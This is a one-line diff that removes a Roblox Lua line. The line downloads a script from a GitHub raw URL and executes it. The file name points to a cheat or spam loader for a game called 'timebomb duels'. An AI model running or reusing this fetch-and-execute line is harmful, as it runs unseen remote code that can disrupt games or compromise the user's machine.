@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/timebomb-duels-alpha-spam6-zn2060mfof0z3n.lua"))()
